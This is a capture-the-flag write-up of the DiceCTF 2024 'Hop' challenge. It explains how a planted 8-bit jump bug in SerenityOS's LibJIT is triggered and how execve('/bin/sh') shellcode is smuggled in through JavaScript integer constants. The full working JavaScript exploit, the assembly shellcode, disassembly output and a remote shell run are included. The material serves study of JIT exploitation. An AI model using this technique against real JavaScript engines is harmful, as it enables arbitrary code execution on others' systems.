# DiceCTF 2024 - Hop

Written by Jacob & Sina

**Summary**: Exploiting a patched version of SerenityOS's Javascript JIT compiler that used 8-bit jumps instead of 32-bit jumps when the offset could fit into 8 bits, by triggering a negative jump when a positive offset was intended, and landing in shellcode splitted into small chunks and entered into memory through Javascript immediate values.

Hop was an interesting Pwn challenge, using SerenityOS's LibJS Engine.

For this challenge we were given a diff of the SerenityOS SourceCode,
two docker files for building and running the challenge environments, and the scripts run on connection.

The `run_inner.sh` script is run when we connect to the box, we give it some javascript, and it runs it with its patched version of LibJS

Here's the patch file we are given:

```diff
Base: https://github.com/SerenityOS/serenity/tree/fbde901614368dcf03d4a8eee800d8b89131465f

diff --git a/Userland/Libraries/LibJIT/X86_64/Assembler.h b/Userland/Libraries/LibJIT/X86_64/Assembler.h
index 79b96cf81f..465c4cb38c 100644
--- a/Userland/Libraries/LibJIT/X86_64/Assembler.h
+++ b/Userland/Libraries/LibJIT/X86_64/Assembler.h
@@ -472,12 +472,23 @@ struct X86_64Assembler {
     private:
         void link_jump(X86_64Assembler& assembler, size_t offset_in_instruction_stream)
         {
-            auto offset = offset_of_label_in_instruction_stream.value() - offset_in_instruction_stream;
+            auto offset = static_cast<ssize_t>(offset_of_label_in_instruction_stream.value() - offset_in_instruction_stream);
             auto jump_slot = offset_in_instruction_stream - 4;
-            assembler.m_output[jump_slot + 0] = (offset >> 0) & 0xff;
-            assembler.m_output[jump_slot + 1] = (offset >> 8) & 0xff;
-            assembler.m_output[jump_slot + 2] = (offset >> 16) & 0xff;
-            assembler.m_output[jump_slot + 3] = (offset >> 24) & 0xff;
+            if (offset <= INT8_MAX && offset >= INT8_MIN && assembler.m_output[jump_slot - 1] == 0xE9) {
+                auto small_offset = static_cast<int8_t>(offset + 3);
+                // JMP rel8
+                assembler.m_output[jump_slot - 1] = 0xEB;
+                assembler.m_output[jump_slot + 0] = small_offset;
+                // NOP3_OVERRIDE_NOP
+                assembler.m_output[jump_slot + 1] = 0x0F;
+                assembler.m_output[jump_slot + 2] = 0x1F;
+                assembler.m_output[jump_slot + 3] = 0x00;
+            } else {
+                assembler.m_output[jump_slot + 0] = (offset >> 0) & 0xff;
+                assembler.m_output[jump_slot + 1] = (offset >> 8) & 0xff;
+                assembler.m_output[jump_slot + 2] = (offset >> 16) & 0xff;
+                assembler.m_output[jump_slot + 3] = (offset >> 24) & 0xff;
+            }
         }
     };
 
```

The first interesting note is that this patch isn't in LibJS, or not *directly*,
it's a patch to the LibJIT libraries label linker.
Normally, LibJS is a regular javascript ***interpreter***, first parsing the input script into bytecode, then running an interpreter to process this bytecode.
But recently (roughly 3 months ago) the SerenityOS Devs have decided to start work on a JIT compiler for LibJS.
This JIT Compiler is still in development with many escape hatches to the normal interpreter,
 but it is able to compile a good ammount of javascript to native x86.

Normally a JIT may be optionally invoked at runtime for performance optimization,
 but since LibJS's JIT is still in development, it requires the environment flag `LIBJS_JIT=1` (helpfully set in our Docker Container) to be run unconditionally on input.

So we know that we can pass in javascript that will be JIT Compiled to x86, time to figure out where the bug is in this patch.

A helpful patch to the source code that helped a lot with inspecting the behaviour of the compiler and exploiting it was setting the `DUMP_JIT_DISASSEMBLY` defined constant to 1 in the `Userland/Libraries/LibJS/JIT/Compiler.cpp` file, before building. This will make the JIT compiler dump disassembly of the compiled code before executing it.

To make working on the challenge easier, we changed `Dockerfile.Build` of the challenge. The original build dockerfile is `Dockerfile.Build.Original`, but the current `Dockerfile.Build` will apply `mypatch.diff` instead of `patch` which will also enable dumping of the disassembly of JIT-compiled code. To build the `js` binary and its required shared libraries and run a container simulating the remote challenge server with it, just use `./run.sh`.
This will also copy the `js` binary and all its required libraries into the `out` folder outside the container.
Also, to be able to run the compiled `js` binary locally (outside the container), we had to do this to set up the required libc and ld version on our machine:

```shell
$ cd out/
$ docker cp peaceful_poitras:/srv/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 .
$ docker cp peaceful_poitras:/srv/lib/x86_64-linux-gnu/libc.so.6 .
$ patchelf --set-interpreter ./ld-linux-x86-64.so.2 --set-rpath . js
```

The patch modifies the `link_jump` method of the `label` class;
This function is called to patch jump instructions emitted before the label position was known, modifying the offset to the correct destination.
Normally the relative jump instruction the JIT emmits is a full 32-bit immediate unconditional jump,
but this patch has a new condition where it emmits a 8-bit immediate jump instead if the jump is within the range of an int_8.
Since the label is modifying the old templated command, there is a redundant 3 byte space left so it adds a 3 byte `nop` instruction to fill out the remaining unused space that the normal jump instruction would take up.
This means that the jump needs to be incremented by 3 to reach the intended offset, but if our offset is >= `INT8_MAX - 2`, this increment of 3 will cause an integer overflow on our immediate jump offset, causing us to jump backwards.

So if we can force the JIT to emmit a relative unconditional jump that is in the range 0x7d-0x7f, than we will break the normal control flow, jumping backwards 0x80-0x82 bytes rather than forward.

Generating this offset isn't straightforward, just passing in some sample Javascript showed that the short jump is triggered often, but it was difficult to create offsets in the exact range required.

We found the most consistent way to generate the labels was to create a for-loop, and modify the contents of the loop to change the distance of the relative jump.

```javascript
for (let i = 0; i < 1; i++) {
	if (i == 0) {
        // code block 1
    } else {
        // code block 2
    }
}
```

In the control-flow structure above, there will be a jump from the end of code block 1 to the end of code block 2 (so it jumps over the whole block 2). By controlling the size of block 2, we can control the offset of this jump and trigger the vulnerability.

This turns out to be a fun sort of linear optimization problem, needing to find the right number of instructions to generate a jump of a specific size.

`[]` will compile to the `NewArray` operation in the bytecode, which has a length of 27 bytes. Similarly, any string literal (e.g. `"a"`) compiles to `NewString` which has a length of 33 bytes after compilation. Immediate integer values compile to `LoadImmediate` with a length of 13 bytes.

After some experimentation, we wrote a small script to find the right combination of `[]`, `"a"`, and numeric literals to reach the specific needed jump offset and trigger the vulnerable negative jump.

```python
for a in range(10):
    for b in range(10):
        for c in range(10):
            if 0x7d <= 13 * a + 27 * b + 33 * c + 18 <= 0x7f:
                print(a, b, c)
```

Ok great, we can regularly trigger the bug, how do we now pwn it?
Well if we could control the code where it jumps to, then its simple, just `execve("/bin/sh")`, but we don't have the ability to output whatever bytes we want.

looking at our generated code we identified that immediate values would get compiled into our source code, so `0x09eb696a;` would cause the coresponding bytes of the immediate to show up in the JIT code, if we could force the backwards jump to land exactly on these bytes, we can write shellcode within these constants.

We then filled our javascript loop from above with `0xcccccccc` immediates, to catch the halt instruction in gdb and find the point where we land on our code.

### From int3 to shellcode

Now that we can point the instruction pointer to user-controlled instructions and land on an `int3`, we need a way to get a shell. The user-controlled chunks can be at most 3 or 4 bytes long using the `LoadImmediate` js bytecode. So we needed to craft our shellcode to fit within these small chunks, with each chunk requiring a `jmp` at the end to link to the next part of our shellcode. Also, because we had to insert some padding at the end of the `if` block to get the negative jump to land in controlled data, we ended up landing at the end of controlled data. The other `LoadImmediate` operations that we can insert in the `if` block have to be located before our landing point, so we also need to chain some backward jumps to open up space for our shellcode and then start executing the main shellcode.

We will write a `eb 89` instruction at the point we land to perform a backward jump. Then, we identify the landing point of this jump and write another `eb 89` there. Continuing this 5 or 6 times, we can go back enough to be able to fit our shellcode in the gaps between.

```
start_main_shellcode <--
...                    |
...                    |
...                    |
[eb 89] <--    ---------
...       |
...       |
...       |
[eb 89] ---
...
same pattern...
...
[eb 89] -> landing point for the vulnerable jump

```

In the diagram above, the `...` are blocks that can contain our main shellcode.

### main shellcode

Since we only control small 4-bytes chunks, we need to split our main shellcode into 4-byte pieces. In each chunk, we can only fit at most 2 bytes of shellcode, before requiring a jump to the next chunk (with the `eb 09` instruction, or `eb 16` in case we want to jump two blocks forward to jump over one of the backward jumps that were previously explained).


With this 2 byte constraint, we needed to find a way to place `/bin/sh` into memory and move it's address into `rdi`.
Placing a breakpoint right before our shellcode was executed,
we noticed that before the shellcode is executed, the`rbx` register holds a pointer to some writable address in memory.
So we could move this address into rdi, and then write the `/bin/sh` string byte-by-byte into the location `rbx` points to with only 2 byte instructions.

This is the final shellcode:

```
.intel_syntax noprefix
.global _start

_start:
# write "/bin/sh" onto the stack
push 0x00
push 0x68
push 0x73
push 0x2f
push 0x6e
push 0x69
push 0x62
push 0x2f

push rbx
pop rdi

# copy "/bin/sh" into some writable location
pop rax
mov byte ptr [rbx], al
inc bl

pop rax
mov byte ptr [rbx], al
inc bl

pop rax
mov byte ptr [rbx], al
inc bl

pop rax
mov byte ptr [rbx], al
inc bl

pop rax
mov byte ptr [rbx], al
inc bl

pop rax
mov byte ptr [rbx], al
inc bl

pop rax
mov byte ptr [rbx], al
inc bl

pop rax
mov byte ptr [rbx], al
inc bl

# setup rsi, rdx, and rax to do execve("/bin/sh", 0, 0)
xor esi, esi
xor edx, edx
push 59
pop rax
syscall
```

### win

Now we need to separate the instructions of this shellcode into 2-byte blocks and add a small jump at the end of each block to the beginning of the next block, and write the bytes in a js script to win. This is the final solution script:

```javascript
for (let i = 0; i < 1; i++) {
	if (i == 0) {
		0x09eb006a;	// push 0
		0x09eb686a;	// push 0x68
		0x09eb736a;	// push 0x73
		0x09eb2f6a;	// push 0x2f
		0x09eb6e6a;	// push 0x6e
		0x09eb696a;	// push 0x69
		0x09eb626a;	// push 0x62
		0x09eb2f6a;	// push 0x2f
		0x16eb5f53;	// push rbx; pop rdi
		
		0xcc89eb;	// backward jump
		
		0x09eb9058;	// pop rax ; nop
		0x09eb0388;	// mov byte ptr [rbx], al
		0x09ebc3fe;	// inc bl
		0x09eb9058;	// same 3 instructions repeated...
		0x09eb0388;
		0x09ebc3fe;
		0x09eb9058;
		0x16eb0388;
		
		0xcc89eb;	// backward jump
		
		0x09ebc3fe;
		0x09eb9058;
		0x09eb0388;
		0x09ebc3fe;
		0x09eb9058;
		0x09eb0388;
		0x09ebc3fe;
		0x16eb9058;
		
		0xcc89eb;	// backward jump

		0x09eb0388;
		0x09ebc3fe;
		0x09eb9058;
		0x09eb0388;
		0x09ebc3fe;
		0x09eb9058;
		0x09eb0388;
		0x16ebc3fe;
		
		0xcc89eb;	// backward jump
		
		0x09ebf631;	// xor esi, esi
		0x09ebd231;	// xor edx, edx
		0x09eb3b6a;	// push 59
		0x09eb9058;	// pop rax
		0x09eb050f;	// syscall
		0x09eb0b0f;	// ud2 => terminate the program if execve fails and we reach here. used for debugging the shellcode.
		0x09ebcccc;	// padding
		0x16ebcccc;	// padding

		0xcc89eb;	// backward jump (vulnerable jump landing point)
		[];"a";[];[];	// padding to make the vulnerable negative jump land in the immediate value above
	} else {
		[];[];[];[];	// padding to trigger a vulnerable negative jump when it tries to jump over this code block
	}
}
```

To summarize, the control flow in handled in a way that results in a `jmp` from the end of the `if` block to after the end of the `else` block (so a jump that jumps over the whole `else` block). The `[];[];[];[];` in the `else` block can change the size of this jump into `0x7e` (in the case of a normal 32-bit jump) which is increased by 3 to be replaced with an 8-bit jump. This will result in a jump instruction of `eb 81` at the end of the `if` block, which will jump backwards into the `if` block itself instead of jumping over the `else` block and to the end of it. the `[];"a";[];[];` line at the end of the `if` block is padding to ensure that this negative jump lands in the constant value above this line. After the jump lands in the integer constant right before the last line of the `if` block, we can control the instructions at `rip` by writing instructions in the form of integer constants. We right instructions to jump backwards several times and open up space for our main shellcode, and when these backward jumps reach the first line of the `if` block in the script above, we start executing our main shellcode by dividing it into 4-byte chunks.

### sample output

Shown below is the output from running our exploit in a version of the challenge patched to also output the generated bytecode and assembly, as you can see, we get our negative jump, shellcode, and finally shell!
Unimportant parts of the disassembly and bytecodes are removed to keep the output short, and important parts of the exploit payload are marked with comments.

```shell
$ LIBJS_JIT=1 ./js -d exploit.js

JS::Bytecode::Executable ()
1:
[   0] CreateLexicalEnvironment
[  18] CreateVariable env:Lexical immutable:false global:false 0 (i)
[  40] Store $6
(....)
7:
[   0] LoadImmediate undefined
[  20] LoadImmediate 166396010    #--> main shellcode
[  40] LoadImmediate 166422634
[  60] LoadImmediate 166425450
[  80] LoadImmediate 166408042
[  a0] LoadImmediate 166424170
[  c0] LoadImmediate 166422890
[  e0] LoadImmediate 166421098
[ 100] LoadImmediate 166408042
[ 120] LoadImmediate 384524115
[ 140] LoadImmediate 13404651
[ 160] LoadImmediate 166432856
[ 180] LoadImmediate 166396808
[ 1a0] LoadImmediate 166446078
[ 1c0] LoadImmediate 166432856
[ 1e0] LoadImmediate 166396808
[ 200] LoadImmediate 166446078
[ 220] LoadImmediate 166432856
[ 240] LoadImmediate 384500616
[ 260] LoadImmediate 13404651
[ 280] LoadImmediate 166446078
[ 2a0] LoadImmediate 166432856
[ 2c0] LoadImmediate 166396808
[ 2e0] LoadImmediate 166446078
[ 300] LoadImmediate 166432856
[ 320] LoadImmediate 166396808
[ 340] LoadImmediate 166446078
[ 360] LoadImmediate 384536664
[ 380] LoadImmediate 13404651
[ 3a0] LoadImmediate 166396808
[ 3c0] LoadImmediate 166446078
[ 3e0] LoadImmediate 166432856
[ 400] LoadImmediate 166396808
[ 420] LoadImmediate 166446078
[ 440] LoadImmediate 166432856
[ 460] LoadImmediate 166396808
[ 480] LoadImmediate 384549886
[ 4a0] LoadImmediate 13404651
[ 4c0] LoadImmediate 166458929
[ 4e0] LoadImmediate 166449713
[ 500] LoadImmediate 166411114
[ 520] LoadImmediate 166432856
[ 540] LoadImmediate 166397199
[ 560] LoadImmediate 166398735
[ 580] LoadImmediate 166448332
[ 5a0] LoadImmediate 384552140
[ 5c0] LoadImmediate 13404651    #--> vulnerable jump landing point
[ 5e0] NewArray                  #--> padding at the end of if block
[ 600] NewString 0 ("a")
[ 620] NewArray
[ 640] NewArray
[ 660] Jump @9                   #--> the vulnerable jump                   
8:
[   0] LoadImmediate undefined
[  20] NewArray
[  40] NewArray                  #--> padding in else block
[  60] NewArray
[  80] NewArray
[  a0] Jump @9                   #--> the vulnerable jump
9:
[   0] Jump @5


Disassembly of '' (exploit.js:1:1):
entry:
0x00007fd8b1da9000  55                    push   rbp
0x00007fd8b1da9001  48 89 e5              mov    rbp,rsp
0x00007fd8b1da9004  53                    push   rbx
0x00007fd8b1da9005  53                    push   rbx
(...)
Block 7:
7:0 LoadImmediate undefined:
0x00007fd8b1da98c3  48 b8 00 00 00 00 00  mov    rax, 0x7ffe000000000000
0x00007fd8b1da98ca  00 fe 7f
0x00007fd8b1da98cd  49 89 c4              mov    r12,rax
7:20 LoadImmediate 166396010:
0x00007fd8b1da98d0  48 b8 6a 00 eb 09 00  mov    rax, 0x7ffa000009eb006a    # main shellcode
0x00007fd8b1da98d7  00 fa 7f
0x00007fd8b1da98da  49 89 c4              mov    r12,rax
7:40 LoadImmediate 166422634:
0x00007fd8b1da98dd  48 b8 6a 68 eb 09 00  mov    rax, 0x7ffa000009eb686a
0x00007fd8b1da98e4  00 fa 7f
0x00007fd8b1da98e7  49 89 c4              mov    r12,rax
(...)
7:5c0 LoadImmediate 13404651:
0x00007fd8b1da9b19  48 b8 eb 89 cc 00 00  mov    rax, 0x7ffa000000cc89eb    # landing point of the vulnerable jump
0x00007fd8b1da9b20  00 fa 7f
0x00007fd8b1da9b23  49 89 c4              mov    r12,rax
7:5e0 NewArray:                                                             # padding at the end of the if block
0x00007fd8b1da9b26  31 f6                 xor    esi,esi
0x00007fd8b1da9b28  31 d2                 xor    edx,edx
0x00007fd8b1da9b2a  57                    push   rdi
0x00007fd8b1da9b2b  6a 00                 push   0x00
0x00007fd8b1da9b2d  48 b8 a0 dc 59 b2 d8  mov    rax, 0x00007fd8b259dca0
0x00007fd8b1da9b34  7f 00 00
0x00007fd8b1da9b37  ff d0                 call   eax
0x00007fd8b1da9b39  48 83 c4 08           add    rsp,0x08
0x00007fd8b1da9b3d  5f                    pop    rdi
0x00007fd8b1da9b3e  49 89 c4              mov    r12,rax
7:600 NewString 0 ("a"):
0x00007fd8b1da9b41  48 be c0 e7 4d 45 69  mov    rsi, 0x00005569454de7c0
0x00007fd8b1da9b48  55 00 00
0x00007fd8b1da9b4b  57                    push   rdi
0x00007fd8b1da9b4c  6a 00                 push   0x00
0x00007fd8b1da9b4e  48 b8 f0 d7 59 b2 d8  mov    rax, 0x00007fd8b259d7f0
0x00007fd8b1da9b55  7f 00 00
0x00007fd8b1da9b58  ff d0                 call   eax
0x00007fd8b1da9b5a  48 83 c4 08           add    rsp,0x08
0x00007fd8b1da9b5e  5f                    pop    rdi
0x00007fd8b1da9b5f  49 89 c4              mov    r12,rax
7:620 NewArray:
0x00007fd8b1da9b62  31 f6                 xor    esi,esi
0x00007fd8b1da9b64  31 d2                 xor    edx,edx
0x00007fd8b1da9b66  57                    push   rdi
0x00007fd8b1da9b67  6a 00                 push   0x00
0x00007fd8b1da9b69  48 b8 a0 dc 59 b2 d8  mov    rax, 0x00007fd8b259dca0
0x00007fd8b1da9b70  7f 00 00
0x00007fd8b1da9b73  ff d0                 call   eax
0x00007fd8b1da9b75  48 83 c4 08           add    rsp,0x08
0x00007fd8b1da9b79  5f                    pop    rdi
0x00007fd8b1da9b7a  49 89 c4              mov    r12,rax
7:640 NewArray:
0x00007fd8b1da9b7d  31 f6                 xor    esi,esi
0x00007fd8b1da9b7f  31 d2                 xor    edx,edx
0x00007fd8b1da9b81  57                    push   rdi
0x00007fd8b1da9b82  6a 00                 push   0x00
0x00007fd8b1da9b84  48 b8 a0 dc 59 b2 d8  mov    rax, 0x00007fd8b259dca0
0x00007fd8b1da9b8b  7f 00 00
0x00007fd8b1da9b8e  ff d0                 call   eax
0x00007fd8b1da9b90  48 83 c4 08           add    rsp,0x08
0x00007fd8b1da9b94  5f                    pop    rdi
0x00007fd8b1da9b95  49 89 c4              mov    r12,rax
7:660 Jump @9:
0x00007fd8b1da9b98  eb 81                 jmp    short b1da9b1b <7:5c0+0x2>    # the vulnerable jump
0x00007fd8b1da9b9a  0f 1f 00              nop    [rax]

Block 8:
8:0 LoadImmediate undefined:
0x00007fd8b1da9b9d  48 b8 00 00 00 00 00  mov    rax, 0x7ffe000000000000       # padding in else block
0x00007fd8b1da9ba4  00 fe 7f
0x00007fd8b1da9ba7  49 89 c4              mov    r12,rax
8:20 NewArray:
0x00007fd8b1da9baa  31 f6                 xor    esi,esi
0x00007fd8b1da9bac  31 d2                 xor    edx,edx
0x00007fd8b1da9bae  57                    push   rdi
0x00007fd8b1da9baf  6a 00                 push   0x00
0x00007fd8b1da9bb1  48 b8 a0 dc 59 b2 d8  mov    rax, 0x00007fd8b259dca0
0x00007fd8b1da9bb8  7f 00 00
0x00007fd8b1da9bbb  ff d0                 call   eax
0x00007fd8b1da9bbd  48 83 c4 08           add    rsp,0x08
0x00007fd8b1da9bc1  5f                    pop    rdi
0x00007fd8b1da9bc2  49 89 c4              mov    r12,rax
8:40 NewArray:
0x00007fd8b1da9bc5  31 f6                 xor    esi,esi
0x00007fd8b1da9bc7  31 d2                 xor    edx,edx
0x00007fd8b1da9bc9  57                    push   rdi
0x00007fd8b1da9bca  6a 00                 push   0x00
0x00007fd8b1da9bcc  48 b8 a0 dc 59 b2 d8  mov    rax, 0x00007fd8b259dca0
0x00007fd8b1da9bd3  7f 00 00
0x00007fd8b1da9bd6  ff d0                 call   eax
0x00007fd8b1da9bd8  48 83 c4 08           add    rsp,0x08
0x00007fd8b1da9bdc  5f                    pop    rdi
0x00007fd8b1da9bdd  49 89 c4              mov    r12,rax
8:60 NewArray:
0x00007fd8b1da9be0  31 f6                 xor    esi,esi
0x00007fd8b1da9be2  31 d2                 xor    edx,edx
0x00007fd8b1da9be4  57                    push   rdi
0x00007fd8b1da9be5  6a 00                 push   0x00
0x00007fd8b1da9be7  48 b8 a0 dc 59 b2 d8  mov    rax, 0x00007fd8b259dca0
0x00007fd8b1da9bee  7f 00 00
0x00007fd8b1da9bf1  ff d0                 call   eax
0x00007fd8b1da9bf3  48 83 c4 08           add    rsp,0x08
0x00007fd8b1da9bf7  5f                    pop    rdi
0x00007fd8b1da9bf8  49 89 c4              mov    r12,rax
8:80 NewArray:
0x00007fd8b1da9bfb  31 f6                 xor    esi,esi
0x00007fd8b1da9bfd  31 d2                 xor    edx,edx
0x00007fd8b1da9bff  57                    push   rdi
0x00007fd8b1da9c00  6a 00                 push   0x00
0x00007fd8b1da9c02  48 b8 a0 dc 59 b2 d8  mov    rax, 0x00007fd8b259dca0
0x00007fd8b1da9c09  7f 00 00
0x00007fd8b1da9c0c  ff d0                 call   eax
0x00007fd8b1da9c0e  48 83 c4 08           add    rsp,0x08
0x00007fd8b1da9c12  5f                    pop    rdi
0x00007fd8b1da9c13  49 89 c4              mov    r12,rax
8:a0 Jump @9:
0x00007fd8b1da9c16  eb 03                 jmp    short b1da9c1b <Block 9>
0x00007fd8b1da9c18  0f 1f 00              nop    [rax]

Block 9:
9:0 Jump @5:
0x00007fd8b1da9c1b  e9 75 fa ff ff        jmp    b1da9695 <Block 5>
common_exit:
0x00007fd8b1da9c20  4c 89 23              mov    [rbx],r12
0x00007fd8b1da9c23  41 5f                 pop    r15
0x00007fd8b1da9c25  41 5e                 pop    r14
0x00007fd8b1da9c27  41 5d                 pop    r13
0x00007fd8b1da9c29  41 5c                 pop    r12
0x00007fd8b1da9c2b  5b                    pop    rbx
0x00007fd8b1da9c2c  5b                    pop    rbx
0x00007fd8b1da9c2d  c9                    leave
0x00007fd8b1da9c2e  c3                    ret

$ # we got a shell!
```

Also a successful remote run:

```shell
$ (cat exploit.js ; echo EOF ; cat) | nc <ip> <port>
id
uid=1000 gid=1000 groups=1000
```

and finally flag `dice{hop_skip_shortjmp}`!